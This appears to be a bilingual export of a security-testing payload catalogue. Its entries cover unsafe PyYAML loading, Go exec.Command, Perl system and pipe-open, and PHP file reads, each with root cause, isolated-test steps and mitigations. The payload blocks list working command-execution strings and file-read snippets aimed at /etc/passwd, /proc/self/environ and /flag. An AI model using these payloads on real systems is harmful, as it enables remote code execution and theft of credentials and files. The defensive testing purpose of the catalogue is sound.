vulnerability.en: The root cause is the service loads untrusted YAML through yaml.load, UnsafeLoader, or an equivalent full-feature loader instead of SafeLoader, allowing whether a YAML loader permits python/object/apply and object/new tags to construct arbitrary Python call objects. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate.

exploitation.zh: 在一次性 Python worker 中先加载普通标量，再将命令替换为写入临时标记的安全函数，逐类测试 apply、new、Popen 与 popen 标签。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。
exploitation.en: load ordinary scalars first in a disposable Python worker, replace commands with a safe temporary-marker function, and test apply, new, Popen, and popen tags separately. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access.

mitigation.zh: 使用 yaml.safe_load/SafeLoader，拒绝语言对象标签并对数据执行 schema 校验，隔离仍需兼容旧 YAML 的迁移 worker。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。
mitigation.en: use yaml.safe_load or SafeLoader, reject language-object tags, validate a data schema, and isolate any migration worker that still handles legacy YAML. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes.

title.zh: 确认“Python YAML 对象构造执行标签”加载 API
title.en: Confirm the Python YAML Object-Construction Execution Tags loader

description.zh: 定位真实反序列化函数、输入来源、允许类型与依赖版本，核对前提“服务对不可信 YAML 使用 yaml.load、UnsafeLoader 或等价全功能 loader，而不是 SafeLoader”。
description.en: Locate the real deserializer, source, allowed types, and dependency versions, confirming that the service loads untrusted YAML through yaml.load, UnsafeLoader, or an equivalent full-feature loader instead of SafeLoader.

title.zh: 建立“PyYAML 不安全对象构造”正常对象基线
title.en: Establish the Unsafe PyYAML Object Construction object baseline

description.zh: 加载固定数据对象并记录类型、生命周期与副作用，再以“实际 Loader 类型、YAML 标签解析日志和隔离 worker 的固定无害调用标记能够对应”作为异常对象证据。
description.en: Load a fixed data object and record types, lifecycle, and side effects, accepting the actual Loader type, YAML tag-resolution log, and fixed harmless call marker from an isolated worker correlate as abnormal-object evidence.

title.zh: 隔离验证“Python YAML 对象构造执行标签”对象
title.en: Validate the Python YAML Object-Construction Execution Tags object in isolation

description.zh: 测试步骤为：在一次性 Python worker 中先加载普通标量，再将命令替换为写入临时标记的安全函数，逐类测试 apply、new、Popen 与 popen 标签。保持原字节不变用于引用，实际运行时将危险动作替换为一次性标记。
description.en: load ordinary scalars first in a disposable Python worker, replace commands with a safe temporary-marker function, and test apply, new, Popen, and popen tags separately. Preserve original bytes for reference while replacing dangerous runtime effects with one-time markers.

attackChain.payload:
!!python/object/apply:os.system ['id']
!!python/object/apply:os.system ['whoami']
!!python/object/apply:os.system ['cat /flag']
!!python/object/apply:os.system ['ls /']
!!python/object/new:subprocess.check_output [['id']]
!!python/object/new:subprocess.check_output [['whoami']]
!!python/object/new:subprocess.check_output [['cat /flag']]
!!python/object/new:subprocess.check_output [['ls /']]
!!python/object/new:subprocess.Popen [['id']]
!!python/object/new:subprocess.Popen [['whoami']]
!!python/object/new:subprocess.Popen [['cat /flag']]
!!python/object/new:subprocess.Popen [['ls /']]
!!python/object/apply:os.popen ['id']
!!python/object/apply:os.popen ['whoami']
!!python/object/apply:os.popen ['cat /flag']
!!python/object/apply:os.popen ['ls /']

title.zh: 迁移到安全数据格式
title.en: Migrate to a safe data format

description.zh: 实施“使用 yaml.safe_load/SafeLoader，拒绝语言对象标签并对数据执行 schema 校验，隔离仍需兼容旧 YAML 的迁移 worker”并重放合法对象、未许可类型和历史令牌，确认数据兼容且对象代码不再加载。
description.en: Apply use yaml.safe_load or SafeLoader, reject language-object tags, validate a data schema, and isolate any migration worker that still handles legacy YAML, replay valid objects, unapproved types, and legacy tokens, and confirm data compatibility without loading object code.

review.rationale: Python YAML 对象构造执行标签保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已确认“Python YAML 对象构造执行标签”的真实 loader、输入格式、依赖版本和允许类型，并满足：服务对不可信 YAML 使用 yaml.load、UnsafeLoader 或等价全功能 loader，而不是 SafeLoader。
prerequisites.en: The real loader, format, dependency versions, and allowed types for Python YAML Object-Construction Execution Tags are known, and the service loads untrusted YAML through yaml.load, UnsafeLoader, or an equivalent full-feature loader instead of SafeLoader.

prerequisites.zh: 可在无外网的一次性进程加载正常对象，并观察实际 Loader 类型、YAML 标签解析日志和隔离 worker 的固定无害调用标记能够对应。
prerequisites.en: A disposable no-network process can load a normal object and observe the actual Loader type, YAML tag-resolution log, and fixed harmless call marker from an isolated worker correlate.

analysis.zh: 阳性必须证明输入到达 loader、对象或函数被构造、触发路径执行，并取得实际 Loader 类型、YAML 标签解析日志和隔离 worker 的固定无害调用标记能够对应。流头、Base64、类名、YAML 标签、解析异常或依赖中存在 gadget 均是假阳性，不能证明“YAML loader 是否允许 python/object/apply 与 object/new 构造任意 Python 调用对象”。
analysis.en: A positive proves loader reachability, object or function construction, trigger execution, and the actual Loader type, YAML tag-resolution log, and fixed harmless call marker from an isolated worker correlate. Headers, Base64, class names, YAML tags, parser errors, or a gadget merely present in dependencies are false positives and do not prove whether a YAML loader permits python/object/apply and object/new tags to construct arbitrary Python call objects.

opsecTips.zh: Python YAML 对象构造执行标签停止条件：将危险动作替换为一次性临时标记；若 loader 尝试联网、加载远程类、访问真实文件或启动非标记进程，立即杀死隔离进程。 本条重点观察“YAML loader 是否允许 python/object/apply 与 object/new 构造任意 Python 调用对象”。
opsecTips.en: Python YAML Object-Construction Execution Tags stop condition: Replace dangerous effects with a one-time marker; kill the isolated process on network access, remote class loading, real-file access, or a non-marker process. The entry-specific focus is whether a YAML loader permits python/object/apply and object/new tags to construct arbitrary Python call objects.

opsecTips.zh: Python YAML 对象构造执行标签清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Python YAML Object-Construction Execution Tags cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique.

name.zh: Go os/exec 与文件读取片段

description.zh: 覆盖 exec.Command 的参数数组与 Shell 形式、Windows PowerShell/cmd 以及 ioutil/os.ReadFile，验证可控 Go 代码或模板扩展的系统能力。
description.en: Covers exec.Command argument arrays and shell forms, Windows PowerShell or cmd, and ioutil or os.ReadFile to test system capabilities exposed through controllable Go code or template extensions.

overview.zh: Go os/exec 与文件读取片段用于核对不可信输入是否进入 exec.Command 的程序或参数，或者进入本地文件读取路径。该条目只在以下前提下适用：应用通过插件、模板函数、规则引擎或动态参数暴露 Go 进程/文件 API，且缺少固定程序和路径约束。有效判定必须取得最终 argv、工作目录、子进程固定输出或测试文件标记和服务日志完整关联；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Go os-exec and File-Read Snippets checks whether untrusted input reaches the executable or arguments of exec.Command or a local file-read path. It applies when plugins, template functions, rule engines, or dynamic parameters expose Go process or file APIs without fixed executable and path constraints. A valid finding requires the final argv, working directory, fixed child output or test-file marker, and service logs fully correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是应用通过插件、模板函数、规则引擎或动态参数暴露 Go 进程/文件 API，且缺少固定程序和路径约束，使应用可能暴露“不可信输入是否进入 exec.Command 的程序或参数，或者进入本地文件读取路径”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when plugins, template functions, rule engines, or dynamic parameters expose Go process or file APIs without fixed executable and path constraints, exposing the runtime boundary of whether untrusted input reaches the executable or arguments of exec.Command or a local file-read path. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 分别测试直接参数数组、sh -c、cmd、PowerShell 与文件 API，全部替换为固定 echo 或专用测试文件并记录平台差异。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: test direct argument arrays, sh -c, cmd, PowerShell, and file APIs separately, replacing all effects with fixed echo or a dedicated test file and recording platform differences. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 只允许固定可执行程序和类型化参数，禁止用户选择 Shell，文件访问使用对象 ID 与固定根目录，服务进程最小权限运行。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: allow only fixed executables with typed arguments, prevent user-selected shells, map file access through object IDs and a fixed root, and run the service with least privilege. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“Go os/exec 与文件读取片段”执行入口
title.en: Confirm the Go os-exec and File-Read Snippets execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“应用通过插件、模板函数、规则引擎或动态参数暴露 Go 进程/文件 API，且缺少固定程序和路径约束”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that plugins, template functions, rule engines, or dynamic parameters expose Go process or file APIs without fixed executable and path constraints, and record runtime version and service identity.

title.zh: 建立“Go 进程与文件 API”安全基线
title.en: Establish the Go Process and File APIs baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“最终 argv、工作目录、子进程固定输出或测试文件标记和服务日志完整关联”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the final argv, working directory, fixed child output or test-file marker, and service logs fully correlate as abnormal evidence.

title.zh: 逐行验证“Go os/exec 与文件读取片段”
title.en: Validate Go os-exec and File-Read Snippets line by line

description.zh: 测试步骤为：分别测试直接参数数组、sh -c、cmd、PowerShell 与文件 API，全部替换为固定 echo 或专用测试文件并记录平台差异。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: test direct argument arrays, sh -c, cmd, PowerShell, and file APIs separately, replacing all effects with fixed echo or a dedicated test file and recording platform differences. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

attackChain.payload:
exec.Command("id").Output()
exec.Command("whoami").Output()
exec.Command("cat", "/flag").Output()
exec.Command("ls", "/").Output()
exec.Command("pwd").Output()
exec.Command("uname", "-a").Output()
exec.Command("hostname").Output()
exec.Command("/bin/sh", "-c", "id").Output()
exec.Command("/bin/sh", "-c", "whoami").Output()
exec.Command("/bin/sh", "-c", "cat /flag").Output()
exec.Command("/bin/sh", "-c", "ls /").Output()
exec.Command("/bin/sh", "-c", "pwd").Output()
exec.Command("/bin/sh", "-c", "uname -a").Output()
exec.Command("/bin/sh", "-c", "hostname").Output()
exec.Command("cmd.exe", "/c", "id").Output()
exec.Command("cmd.exe", "/c", "whoami").Output()
exec.Command("cmd.exe", "/c", "type flag.txt").Output()
exec.Command("cmd.exe", "/c", "dir").Output()
exec.Command("powershell", "-c", "id").Output()
exec.Command("powershell", "-c", "whoami").Output()
exec.Command("powershell", "-c", "cat flag.txt").Output()
exec.Command("powershell", "-c", "dir").Output()
ioutil.ReadFile("/etc/passwd")
ioutil.ReadFile("/flag")
ioutil.ReadFile("/flag.txt")
ioutil.ReadFile("/proc/self/environ")
ioutil.ReadFile("/proc/self/cmdline")
ioutil.ReadFile("/proc/version")
os.ReadFile("/etc/passwd")
os.ReadFile("/flag")
os.ReadFile("/flag.txt")
os.ReadFile("/proc/self/environ")
os.ReadFile("/proc/self/cmdline")
os.ReadFile("/proc/version")

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“只允许固定可执行程序和类型化参数，禁止用户选择 Shell，文件访问使用对象 ID 与固定根目录，服务进程最小权限运行”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying allow only fixed executables with typed arguments, prevent user-selected shells, map file access through object IDs and a fixed root, and run the service with least privilege, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

review.rationale: Go os/exec 与文件读取片段保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“Go os/exec 与文件读取片段”的真实输入点、处理器和运行时版本，并确认：应用通过插件、模板函数、规则引擎或动态参数暴露 Go 进程/文件 API，且缺少固定程序和路径约束。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Go os-exec and File-Read Snippets, confirming that plugins, template functions, rule engines, or dynamic parameters expose Go process or file APIs without fixed executable and path constraints.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察最终 argv、工作目录、子进程固定输出或测试文件标记和服务日志完整关联。
prerequisites.en: The test worker is disposable and can observe the final argv, working directory, fixed child output or test-file marker, and service logs fully correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得最终 argv、工作目录、子进程固定输出或测试文件标记和服务日志完整关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“不可信输入是否进入 exec.Command 的程序或参数，或者进入本地文件读取路径”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the final argv, working directory, fixed child output or test-file marker, and service logs fully correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether untrusted input reaches the executable or arguments of exec.Command or a local file-read path.

opsecTips.zh: Go os/exec 与文件读取片段停止条件：“Go os/exec 与文件读取片段”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“不可信输入是否进入 exec.Command 的程序或参数，或者进入本地文件读取路径”。
opsecTips.en: Go os-exec and File-Read Snippets stop condition: Use only a one-time fixed marker for Go os-exec and File-Read Snippets; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether untrusted input reaches the executable or arguments of exec.

opsecTips.zh: Go os/exec 与文件读取片段清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Go os-exec and File-Read Snippets cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: Perl system 与管道执行片段
name.en: Perl System and Pipe Execution Snippets

description.zh: 覆盖 Perl system 的 Linux/Windows 参数、PowerShell 调用与 open 管道形式，验证可控 Perl 代码是否创建系统命令子进程。
description.en: Covers Perl system arguments for Linux and Windows, PowerShell invocation, and open-pipe forms to test whether controllable Perl code creates command processes.

overview.zh: Perl system 与管道执行片段用于核对用户可控 Perl 表达式是否进入 system 或带竖线的 open，并由哪个平台 Shell 解释参数。该条目只在以下前提下适用：CGI、模板、插件或规则引擎执行不可信 Perl，服务身份允许子进程，且命令和参数未固定。有效判定必须取得Perl 版本、最终参数列表、子进程固定输出与 CGI 或任务日志相对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。
overview.en: Perl System and Pipe Execution Snippets checks whether controllable Perl expressions reach system or pipe-open and which platform shell interprets the arguments. It applies when CGI, templates, plugins, or rule engines execute untrusted Perl, the service identity can spawn children, and commands plus arguments are not fixed. A valid finding requires Perl version, final argument list, fixed child output, and CGI or task logs correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution.

vulnerability.zh: 风险根因是CGI、模板、插件或规则引擎执行不可信 Perl，服务身份允许子进程，且命令和参数未固定，使应用可能暴露“用户可控 Perl 表达式是否进入 system 或带竖线的 open，并由哪个平台 Shell 解释参数”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。
vulnerability.en: The risk exists when CGI, templates, plugins, or rule engines execute untrusted Perl, the service identity can spawn children, and commands plus arguments are not fixed, exposing the runtime boundary of whether controllable Perl expressions reach system or pipe-open and which platform shell interprets the arguments. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability.

exploitation.zh: 按参数数组、cmd、PowerShell 和 pipe-open 分组，只执行固定 echo，记录 list-form system 与 Shell 字符串的解释差异。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。
exploitation.en: group list-form system, cmd, PowerShell, and pipe-open separately, execute only fixed echo, and record list-versus-shell-string interpretation differences. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes.

mitigation.zh: 移除不可信 Perl 求值，使用 list-form system 调用固定程序并验证参数，限制 CGI 账户的子进程与出口权限。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。
mitigation.en: remove untrusted Perl evaluation, use list-form system with fixed executables and validated arguments, and restrict CGI identities from child processes and egress. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths.

title.zh: 确认“Perl system 与管道执行片段”执行入口
title.en: Confirm the Perl System and Pipe Execution Snippets execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“CGI、模板、插件或规则引擎执行不可信 Perl，服务身份允许子进程，且命令和参数未固定”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that CGI, templates, plugins, or rule engines execute untrusted Perl, the service identity can spawn children, and commands plus arguments are not fixed, and record runtime version and service identity.

title.zh: 建立“Perl 进程执行”安全基线
title.en: Establish the Perl Process Execution baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“Perl 版本、最终参数列表、子进程固定输出与 CGI 或任务日志相对应”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting Perl version, final argument list, fixed child output, and CGI or task logs correlate as abnormal evidence.

title.zh: 逐行验证“Perl system 与管道执行片段”
title.en: Validate Perl System and Pipe Execution Snippets line by line

description.zh: 测试步骤为：按参数数组、cmd、PowerShell 和 pipe-open 分组，只执行固定 echo，记录 list-form system 与 Shell 字符串的解释差异。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: group list-form system, cmd, PowerShell, and pipe-open separately, execute only fixed echo, and record list-versus-shell-string interpretation differences. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.

title.zh: 修复运行时边界并回归
title.en: Remediate and regress the runtime boundary

description.zh: 实施“移除不可信 Perl 求值，使用 list-form system 调用固定程序并验证参数，限制 CGI 账户的子进程与出口权限”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。
description.en: After applying remove untrusted Perl evaluation, use list-form system with fixed executables and validated arguments, and restrict CGI identities from child processes and egress, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable.

review.rationale: Perl system 与管道执行片段保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已在授权隔离环境定位“Perl system 与管道执行片段”的真实输入点、处理器和运行时版本，并确认：CGI、模板、插件或规则引擎执行不可信 Perl，服务身份允许子进程，且命令和参数未固定。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Perl System and Pipe Execution Snippets, confirming that CGI, templates, plugins, or rule engines execute untrusted Perl, the service identity can spawn children, and commands plus arguments are not fixed.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察Perl 版本、最终参数列表、子进程固定输出与 CGI 或任务日志相对应。
prerequisites.en: The test worker is disposable and can observe Perl version, final argument list, fixed child output, and CGI or task logs correlate.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得Perl 版本、最终参数列表、子进程固定输出与 CGI 或任务日志相对应。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“用户可控 Perl 表达式是否进入 system 或带竖线的 open，并由哪个平台 Shell 解释参数”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus Perl version, final argument list, fixed child output, and CGI or task logs correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether controllable Perl expressions reach system or pipe-open and which platform shell interprets the arguments.

opsecTips.zh: Perl system 与管道执行片段停止条件：“Perl system 与管道执行片段”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“用户可控 Perl 表达式是否进入 system 或带竖线的 open，并由哪个平台 Shell 解释参数”。
opsecTips.en: Perl System and Pipe Execution Snippets stop condition: Use only a one-time fixed marker for Perl System and Pipe Execution Snippets; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether controllable Perl expressions reach system or pipe-open and which platform shell interprets the arguments.

opsecTips.zh: Perl system 与管道执行片段清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Perl System and Pipe Execution Snippets cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

name.zh: PHP 源码与本地文件读取片段
name.en: PHP Source and Local File Read Snippets

description.zh: 覆盖 highlight_file、file_get_contents、readfile、include、SplFileObject 与目录迭代，验证已执行 PHP 代码的文件读取范围。
description.en: Covers highlight_file, file_get_contents, readfile, include, SplFileObject, and directory iteration to test the file-read scope of already executing PHP code.

overview.zh: PHP 源码与本地文件读取片段属于已获得服务器端代码执行上下文后的文件读取样例，验证目标为PHP 服务身份通过不同文件和目录 API 能够读取或包含哪些应用外路径。成立前提为：攻击者已经能执行 PHP 代码，服务账户具有目标文件权限，并且路径和 wrapper 未被固定对象映射限制。必须以预置测试文件的唯一标记、PHP 文件 API 日志和响应相对应，目录遍历只返回专用测试目录作为证据，不能从路径字符串或异常消息推断文件内容已泄露。
overview.en: PHP Source and Local File Read Snippets contains file-read samples used after server-side code execution, testing which out-of-application paths the PHP service identity can read or include through file and directory APIs. It applies when the attacker already executes PHP, the service identity has target-file access, and paths plus wrappers are not constrained by fixed object mapping. Evidence requires a unique planted file marker, PHP file-API logs, and the response correlate, while directory iteration is limited to a dedicated test directory; path strings and error messages do not prove content disclosure.

vulnerability.zh: 风险边界是攻击者已经能执行 PHP 代码，服务账户具有目标文件权限，并且路径和 wrapper 未被固定对象映射限制，使运行时可能暴露“PHP 服务身份通过不同文件和目录 API 能够读取或包含哪些应用外路径”。应明确这是 WebShell/代码执行后的能力确认，而不是独立 LFI；报告必须说明服务身份、规范路径、读取 API 和实际最小数据范围。
vulnerability.en: The boundary exists when the attacker already executes PHP, the service identity has target-file access, and paths plus wrappers are not constrained by fixed object mapping, exposing which out-of-application paths the PHP service identity can read or include through file and directory APIs. This is post-webshell or post-code-execution capability confirmation rather than standalone LFI, and reports must state service identity, canonical path, API, and minimal data scope.

exploitation.zh: 将 flag、系统路径和源码目标全部替换为只读测试文件/目录，分别验证读取、包含、wrapper 与迭代器行为，不访问真实敏感数据。所有系统、flag、配置和源码路径均替换为专用无敏感测试文件或目录；每轮只调用一个文件 API，并保存打开路径、权限结果、响应标记和清理记录。
exploitation.en: replace flag, system, and source targets with read-only test files or directories and validate reads, includes, wrappers, and iterators separately without accessing real sensitive data. Replace every system, flag, configuration, and source path with a dedicated nonsensitive test file or directory, invoke one file API per run, and preserve opened path, permission result, response marker, and cleanup record.

mitigation.zh: 阻止动态 PHP 执行，文件访问采用对象 ID、固定根目录和 wrapper 允许列表，服务身份不读取秘密或应用源码目录。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认正常文件功能仍可用，同时对象映射与操作系统权限共同阻止越界读取。
mitigation.en: prevent dynamic PHP execution, map file access through object IDs, a fixed root, and wrapper allowlists, and deny the service identity access to secrets and source directories. Retest valid business objects, out-of-root paths, and symbolic-link boundaries under the same identity to preserve file features while object mapping and OS permissions block out-of-scope reads.

title.zh: 确认“PHP 源码与本地文件读取片段”前置执行上下文
title.en: Confirm the PHP Source and Local File Read Snippets prerequisite context

description.zh: 先证明代码执行或 WebShell 上下文已经存在，再核对文件读取前提“攻击者已经能执行 PHP 代码，服务账户具有目标文件权限，并且路径和 wrapper 未被固定对象映射限制”。
description.en: Prove the code-execution or webshell context first, then confirm the file-read prerequisites: the attacker already executes PHP, the service identity has target-file access, and paths plus wrappers are not constrained by fixed object mapping.

title.zh: 建立专用测试文件基线
title.en: Establish a dedicated test-file baseline

description.zh: 挂载只含唯一标记的只读文件，记录规范路径、服务身份与权限，并以“预置测试文件的唯一标记、PHP 文件 API 日志和响应相对应，目录遍历只返回专用测试目录”作为读取证据。
description.en: Mount a read-only file containing one marker, record canonical path, identity, and permissions, and use a unique planted file marker, PHP file-API logs, and the response correlate, while directory iteration is limited to a dedicated test directory as read evidence.

title.zh: 逐 API 验证“PHP 源码与本地文件读取片段”
title.en: Validate PHP Source and Local File Read Snippets by API

description.zh: 测试步骤为：将 flag、系统路径和源码目标全部替换为只读测试文件/目录，分别验证读取、包含、wrapper 与迭代器行为，不访问真实敏感数据。原命令保留用于引用，执行时所有敏感路径均替换为测试文件。
description.en: replace flag, system, and source targets with read-only test files or directories and validate reads, includes, wrappers, and iterators separately without accessing real sensitive data. Preserve original commands for reference while replacing every sensitive runtime path with the test file.

attackChain.payload:
<?php highlight_file(__FILE__);?>
<?php show_source(__FILE__);?>
<?php echo file_get_contents('/flag');?>
<?php echo file_get_contents('/flag.txt');?>
<?php readfile('/flag');?>
<?php include('/flag');?>
<?php require('/flag');?>
<?php echo implode('',file('/flag'));?>
<?php echo implode('',file('php://filter/convert.base64-encode/resource=/flag'));?>
<?php $f=fopen('/flag','r');echo fread($f,1024);fclose($f);?>
<?php $f=new SplFileObject('/flag');echo $f->fread(1024);?>
<?php print_r(scandir('.'));?>
<?php print_r(scandir('/'));?>
<?php $a=new DirectoryIterator('glob:///*');foreach($a as $f){echo $f;}?>
<?php $a=new RecursiveDirectoryIterator('/');foreach(new RecursiveIteratorIterator($a) as $f){echo $f;}?>

title.zh: 收紧文件边界并回归
title.en: Tighten file boundaries and regress

description.zh: 实施“阻止动态 PHP 执行，文件访问采用对象 ID、固定根目录和 wrapper 允许列表，服务身份不读取秘密或应用源码目录”后验证合法对象、越界路径与符号链接，确认正常读取保留且服务身份无法越权。
description.en: After applying prevent dynamic PHP execution, map file access through object IDs, a fixed root, and wrapper allowlists, and deny the service identity access to secrets and source directories, test valid objects, out-of-root paths, and symlinks to preserve valid reads while preventing identity overreach.

review.rationale: PHP 源码与本地文件读取片段保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已先证明“PHP 源码与本地文件读取片段”依赖的 WebShell/代码执行上下文，并确认：攻击者已经能执行 PHP 代码，服务账户具有目标文件权限，并且路径和 wrapper 未被固定对象映射限制。
prerequisites.en: The prerequisite webshell or code-execution context for PHP Source and Local File Read Snippets is proven, and the attacker already executes PHP, the service identity has target-file access, and paths plus wrappers are not constrained by fixed object mapping.

prerequisites.zh: 隔离环境只挂载含随机标记的无敏感测试文件或目录，可观察预置测试文件的唯一标记、PHP 文件 API 日志和响应相对应，目录遍历只返回专用测试目录。
prerequisites.en: The isolated environment mounts only a nonsensitive marked test file or directory and can observe a unique planted file marker, PHP file-API logs, and the response correlate, while directory iteration is limited to a dedicated test directory.

analysis.zh: 阳性仅指服务身份通过指定 API 读到预置标记并取得预置测试文件的唯一标记、PHP 文件 API 日志和响应相对应，目录遍历只返回专用测试目录。路径回显、权限/不存在异常、目录名或在已有 Shell 中直接 cat 均不能证明“PHP 服务身份通过不同文件和目录 API 能够读取或包含哪些应用外路径”。
analysis.en: A positive means the service identity reads the planted marker through the specified API and a unique planted file marker, PHP file-API logs, and the response correlate, while directory iteration is limited to a dedicated test directory. Reflected paths, permission or not-found errors, directory names, or direct cat from an existing shell do not prove which out-of-application paths the PHP service identity can read or include through file and directory APIs.

opsecTips.zh: PHP 源码与本地文件读取片段停止条件：只访问专用测试文件；响应出现真实配置、环境变量、令牌、用户数据或系统文件片段时立即停止并隔离输出。 本条重点观察“PHP 服务身份通过不同文件和目录 API 能够读取或包含哪些应用外路径”。
opsecTips.en: PHP Source and Local File Read Snippets stop condition: Access only the dedicated test file; stop and isolate output if real configuration, environment values, tokens, user data, or system-file fragments appear. The entry-specific focus is which out-of-application paths the PHP service identity can read or include through file and directory APIs.

opsecTips.zh: PHP 源码与本地文件读取片段清理条件：测试后删除挂载文件和临时 WebShell，清空响应缓存并重建容器，确认报告与日志只保留随机标记。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP Source and Local File Read Snippets cleanup condition: Remove mounted files and temporary webshells, clear response caches, rebuild the container, and verify reports and logs retain only the random marker. Recheck that no triggerable state remains for this technique.

name.zh: CTF Flag 路径候选字典

description.zh: 仅包含 /flag、扩展名、备份后缀和通配路径候选，没有执行语义或应用数据流，应归入 Web 字典工具而非 RCE Payload。
